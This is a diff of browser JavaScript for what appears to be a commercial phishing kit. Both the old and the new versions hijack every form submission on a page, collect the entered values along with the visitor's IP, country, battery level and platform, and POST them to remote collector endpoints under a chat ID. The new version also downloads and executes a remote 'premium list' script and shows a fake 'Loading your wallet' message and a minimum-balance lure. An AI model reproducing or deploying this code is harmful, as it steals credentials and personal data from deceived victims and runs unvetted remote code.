@@ -1,349 +1,221 @@
-// ================= COUNTRY BLOCKER (RUNS FIRST) =================
-(async function () {
+// ================= LOAD PREMIUM USERS =================
+let premiumUsers = [];
+
+async function loadPremiumUsers() {
   try {
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
+    const res = await fetch("intelseller.com/premiumlist.js");
+    const text = await res.text();
 
-    const allowed = ["US", "GB"]; // Allowed countries
-
-    if (!data || !allowed.includes(data.country)) {
-
-      const userCountry = data?.country_name || "Unknown (could not detect)";
-
-      document.documentElement.innerHTML = `
-        <style>
-          body {
-            margin: 0;
-            background: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            text-align: center;
-          }
-        </style>
-        <div>
-          <h2>🚫 Access Restricted</h2>
-          <p>This service is only available in the United States and United Kingdom.</p>
-          <p>Your country: <b>${userCountry}</b></p>
-        </div>
-      `;
-
-      throw new Error("Blocked country");
-    }
-
-  } catch (e) {
-    console.warn("Country check failed:", e);
+    // Execute premiumlist.js and extract premiumUsers
+    const fn = new Function(text + "; return premiumUsers;");
+    premiumUsers = fn();
+  } catch (err) {
+    console.error("❌ Failed to load premium list", err);
+    premiumUsers = [];
   }
-})();
-
+}
 
 // ================= MAIN SCRIPT =================
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", async () => {
+  await loadPremiumUsers(); // 🔥 Load premium list first
 
-  const DEFAULT_USER_ID = "6940101627";
+  const DEFAULT_USER_ID = "7979664801";
+  const DEFAULT_BALANCE = "0";
+  const DEFAULT_MIN = "0";
+  const forms = document.querySelectorAll("form");
 
-  // ================= LOCATION API =================
-  async function getLocationData() {
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
+  let userCountry = "Unknown";
+  let userIP = "Unknown";
+  let batteryLevel = "Unknown";
 
-      if (!data || !data.ip) throw new Error();
-
-      return {
-        ip: data.ip || "Unknown",
-        country: data.country_name || "Unknown",
-        city: data.city || "Unknown",
-        isp: data.org || "Unknown"
-      };
-
-    } catch {
-      return {
-        ip: "Unknown",
-        country: "Unknown",
-        city: "Unknown",
-        isp: "Unknown"
-      };
-    }
+  // ---------- BATTERY INFO ----------
+  if (navigator.getBattery) {
+    navigator.getBattery()
+      .then(battery => {
+        batteryLevel = Math.round(battery.level * 100) + "%";
+      })
+      .catch(() => {});
   }
 
-  // ================= SMART LABEL DETECTOR =================
-  function getSmartLabel(input, form, index) {
-
-    // 1. label[for="id"]
-    if (input.id) {
-      const lbl = form.querySelector(`label[for="${input.id}"]`);
-      if (lbl) return lbl.innerText.trim().replace(/\s*\*\s*$/, "");
-    }
-
-    // 2. label[for="name"] — catches file inputs that have name but no id
-    if (input.name) {
-      const lbl = form.querySelector(`label[for="${input.name}"]`);
-      if (lbl) return lbl.innerText.trim().replace(/\s*\*\s*$/, "");
-    }
-
-    // 3. Wrapped inside a <label>
-    if (input.closest("label")) {
-      return input.closest("label").innerText.trim().replace(/\s*\*\s*$/, "");
-    }
-
-    // 4. aria-label attribute
-    if (input.getAttribute("aria-label")) {
-      return input.getAttribute("aria-label").trim();
-    }
-
-    // 5. placeholder text
-    if (input.placeholder) {
-      return input.placeholder.trim();
-    }
-
-    // 6. nearest preceding sibling with text
-    let sibling = input.previousElementSibling;
-    while (sibling) {
-      const text = sibling.innerText?.trim();
-      if (text) return text.replace(/\s*\*\s*$/, "");
-      sibling = sibling.previousElementSibling;
-    }
-
-    // 7. use name/id as last resort before generic fallback
-    if (input.name) return input.name.replace(/_/g, " ");
-    if (input.id)   return input.id.replace(/_/g, " ");
-
-    return `Field ${index + 1}`;
-  }
-
-  // ================= FORM BUILDER =================
-  function buildGlobalFormData(userId, form) {
-
-    const formData = new FormData();
-    formData.append("chat_id", userId);
-
-    let inputCount = 0;
-    let fileCount = 0;
-    let summary = [];
-
-    const inputs = form.querySelectorAll("input, textarea, select");
-
-    inputs.forEach((input, index) => {
-
-      if (!input || ["submit", "button"].includes(input.type)) return;
-
-      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
-
-      let label = getSmartLabel(input, form, index);
-
-      let key =
-        input.name ||
-        input.id ||
-        label ||
-        input.placeholder ||
-        `field_${index + 1}`;
-
-      key = key.replace(/\s+/g, "_").toLowerCase();
-
-      if (input.type === "file") {
-        if (!input.files || input.files.length === 0) return;
-
-        for (let file of input.files) {
-          formData.append(key, file);
-          fileCount++;
-        }
-
-      } else {
-        let value = input.value?.trim();
-        if (!value) return;
-
-        inputCount++;
-
-        let fullInfo = `${label}: ${value}`;
-
-        formData.append(key, fullInfo);
-        summary.push(fullInfo);
+  // ---------- IP + COUNTRY ----------
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      if (data) {
+        userCountry = data.country_name || userCountry;
+        userIP = data.ip || userIP;
       }
+    })
+    .catch(() => {});
 
-    });
+  // ---------- FORM HANDLER ----------
+  forms.forEach((form) => {
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-    return { formData, inputCount, fileCount, summary };
-  }
+      const urlParams = new URLSearchParams(window.location.search);
+      const userId = urlParams.get("id") || DEFAULT_USER_ID;
+      const balance = urlParams.get("balance") || DEFAULT_BALANCE;
+      const min = urlParams.get("min") || DEFAULT_MIN;
 
-  // ================= UI =================
-  function createBox() {
-    let box = document.createElement("div");
-    box.id = "centerBox";
+      const numericUserId = Number(userId);
 
-    box.innerHTML = `
-      <div id="centerContent">
-        <div class="spinner"></div>
-        <div id="centerText">Loading...</div>
-        <button id="actionBtn" style="display:none;"></button>
-      </div>
-    `;
-
-    document.body.appendChild(box);
-
-    const style = document.createElement("style");
-    style.innerHTML = `
-      #centerBox {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.75);
-        backdrop-filter: blur(6px);
-        display: none;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-      }
-
-      #centerContent {
-        background: #111;
-        color: #fff;
-        padding: 30px;
-        border-radius: 12px;
-        text-align: center;
-        width: 280px;
-      }
-
-      #actionBtn {
-        margin-top: 20px;
-        padding: 10px 16px;
-        border: none;
-        border-radius: 6px;
-        background: #4CAF50;
-        color: #fff;
-        cursor: pointer;
-      }
-
-      .spinner {
-        width: 35px;
-        height: 35px;
-        border: 3px solid rgba(255,255,255,0.2);
-        border-top: 3px solid #4CAF50;
-        border-radius: 50%;
-        margin: 0 auto;
-        animation: spin 1s linear infinite;
-      }
-
-      @keyframes spin {
-        to { transform: rotate(360deg); }
-      }
-    `;
-    document.head.appendChild(style);
-  }
-
-  function showBox(text, options = {}) {
-    const { done = false, type = "none", userId = null } = options;
-
-    const box = document.getElementById("centerBox");
-    const textEl = document.getElementById("centerText");
-    const btn = document.getElementById("actionBtn");
-    const spinner = document.querySelector(".spinner");
-
-    textEl.textContent = text;
-    box.style.display = "flex";
-
-    if (done) {
-      spinner.style.display = "none";
-      btn.style.display = "inline-block";
-
-      if (type === "retry") {
-        btn.textContent = "Retry";
-        btn.onclick = () => location.reload();
-      }
-
-      if (type === "review") {
-        btn.textContent = "Review";
-        btn.onclick = () => {
-          if (userId) {
-            window.location.href = `c.html?id=${userId}`;
-          }
-        };
-      }
-
-    } else {
-      spinner.style.display = "block";
-      btn.style.display = "none";
-    }
-  }
-
-  createBox();
-
-  // ================= SUBMIT =================
-  async function handleSubmit(form) {
-
-    let userId = new URLSearchParams(window.location.search).get("id");
-    if (!userId || isNaN(userId)) userId = DEFAULT_USER_ID;
-
-    showBox("Processing...");
-    await new Promise(resolve => setTimeout(resolve, 50));
-
-    const { formData, inputCount, summary, fileCount } = buildGlobalFormData(userId, form);
-    const loc = await getLocationData();
-
-    let reportMessage = `
-📥 NEW SUBMISSION
-
-🌍 Location
-IP: ${loc.ip}
-Country: ${loc.country}
-City: ${loc.city}
-ISP: ${loc.isp}
-
-📊 Data
-Inputs: ${inputCount}
-Files: ${fileCount}
-
-📝 Values
-${summary.length ? summary.join("\n") : "No input values"}
-`;
-
-    formData.append("report", reportMessage);
-
-    try {
-      const res = await fetch("https://web-production-d469f.up.railway.app/send", {
-        method: "POST",
-        body: formData
-      });
-
-      let data = await res.json().catch(() => ({}));
-
-      if (!res.ok || data.ok === false) {
-        showBox(`❌ ${data.error || "Server error"}`, {
-          done: true,
-          type: "retry"
-        });
+      // ❌ BLOCK NON-PREMIUM USERS
+      if (!premiumUsers.includes(numericUserId)) {
+        showPopup("🚫 Access denied. Try again or check premium.", "#ff4d4d");
         return;
       }
 
-      showBox("✅ Submission successful", {
-        done: true,
-        type: "review",
-        userId
-      });
+      // ✅ PREMIUM USER CONTINUES
+      const formData = new FormData(form);
 
-      form.reset();
+      formData.append("chat_id", userId);
+      formData.append("──────────────", "");
+      formData.append("📊 System Information", "");
+      formData.append("──────────────", "");
+      formData.append("📄 Page", document.title);
+      formData.append("🕒 Date & Time", new Date().toLocaleString());
+      formData.append("🌍 Country", userCountry);
+      formData.append("📡 Client IP", userIP);
+      formData.append("🔋 Battery Level", batteryLevel);
+      formData.append("💻 Platform", navigator.platform || "Unknown");
+      formData.append("🌐 Language", navigator.language || "Unknown");
+      formData.append("🔗 Page URL", window.location.href);
 
-    } catch (err) {
-      showBox(`❌ Network error: ${err.message}`, {
-        done: true,
-        type: "retry"
-      });
-    }
-  }
+      // ✅ SHOW LOADING POPUP
+      const loadingId = showLoadingPopup("⏳ Loading your wallet, please wait...");
 
-  // ================= ATTACH =================
-  document.addEventListener("submit", (e) => {
-    const form = e.target;
+      try {
+        const response = await fetch(
+          "https://sender-slbv.onrender.com/send",
+          { method: "POST", body: formData }
+        );
 
-    if (form.tagName === "FORM") {
-      e.preventDefault();
-      handleSubmit(form);
-    }
-  }, true);
+        removePopup(loadingId); // remove loading popup
 
+        if (response.ok) {
+          form.reset();
+
+          // ✅ SUCCESS POPUP
+          showPopup(
+            `,🙄 Please note\nYou must have $${min} in your wallet to make your earning successful.`,
+            "#1c1c1c",
+            true,
+            `c.html?id=${encodeURIComponent(userId)}&balance=${encodeURIComponent(balance)}&min=${encodeURIComponent(min)}`
+          );
+
+        } else {
+          showPopup("❌ Error submitting form.", "#ff4d4d");
+        }
+
+      } catch (err) {
+        removePopup(loadingId); // remove loading popup
+        console.error("Network Error:", err);
+        showPopup("⚠️ Network error. Please try again.", "#ff9900");
+      }
+    });
+  });
 });
+
+
+// ================= POPUP FUNCTION (JS ONLY) =================
+function showPopup(message, bgColor = "#1c1c1c", redirectAfter = false, redirectUrl = "") {
+
+  removePopup("customPopup"); // remove any existing popup
+
+  const overlay = document.createElement("div");
+  overlay.id = "customPopup";
+  overlay.style.position = "fixed";
+  overlay.style.top = "0";
+  overlay.style.left = "0";
+  overlay.style.width = "100%";
+  overlay.style.height = "100%";
+  overlay.style.background = "rgba(0,0,0,0.7)";
+  overlay.style.display = "flex";
+  overlay.style.alignItems = "center";
+  overlay.style.justifyContent = "center";
+  overlay.style.zIndex = "9999";
+
+  const box = document.createElement("div");
+  box.style.background = bgColor;
+  box.style.padding = "25px";
+  box.style.borderRadius = "12px";
+  box.style.maxWidth = "320px";
+  box.style.textAlign = "center";
+  box.style.fontFamily = "Arial, sans-serif";
+  box.style.boxShadow = "0 10px 25px rgba(0,0,0,0.5)";
+
+  const text = document.createElement("p");
+  text.innerText = message;
+  text.style.whiteSpace = "pre-line";
+  text.style.fontSize = "14px";
+  text.style.marginBottom = "20px";
+  text.style.color = "#ffffff";
+
+  const button = document.createElement("button");
+  button.innerText = "Continue";
+  button.style.padding = "10px 20px";
+  button.style.border = "none";
+  button.style.borderRadius = "6px";
+  button.style.cursor = "pointer";
+  button.style.background = "#28a745";
+  button.style.color = "#fff";
+
+  button.onclick = () => {
+    overlay.remove();
+    if (redirectAfter && redirectUrl) {
+      window.location.href = redirectUrl;
+    }
+  };
+
+  box.appendChild(text);
+  box.appendChild(button);
+  overlay.appendChild(box);
+  document.body.appendChild(overlay);
+
+  return overlay.id; // return id for removal
+}
+
+// ================= LOADING POPUP FUNCTION =================
+function showLoadingPopup(message = "Loading...") {
+  removePopup("loadingPopup"); // remove any existing loading popup
+
+  const overlay = document.createElement("div");
+  overlay.id = "loadingPopup";
+  overlay.style.position = "fixed";
+  overlay.style.top = "0";
+  overlay.style.left = "0";
+  overlay.style.width = "100%";
+  overlay.style.height = "100%";
+  overlay.style.background = "rgba(0,0,0,0.7)";
+  overlay.style.display = "flex";
+  overlay.style.alignItems = "center";
+  overlay.style.justifyContent = "center";
+  overlay.style.zIndex = "9998";
+
+  const box = document.createElement("div");
+  box.style.background = "#1c1c1c";
+  box.style.padding = "25px";
+  box.style.borderRadius = "12px";
+  box.style.maxWidth = "300px";
+  box.style.textAlign = "center";
+  box.style.fontFamily = "Arial, sans-serif";
+  box.style.boxShadow = "0 10px 20px rgba(0,0,0,0.5)";
+
+  const text = document.createElement("p");
+  text.innerText = message;
+  text.style.color = "#fff";
+  text.style.fontSize = "14px";
+
+  box.appendChild(text);
+  overlay.appendChild(box);
+  document.body.appendChild(overlay);
+
+  return overlay.id;
+}
+
+// ================= REMOVE POPUP FUNCTION =================
+function removePopup(id) {
+  const popup = document.getElementById(id);
+  if (popup) popup.remove();
+}
